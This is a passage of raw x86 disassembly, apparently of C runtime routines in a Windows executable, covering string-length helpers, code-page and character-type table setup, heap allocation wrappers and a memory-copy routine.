  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
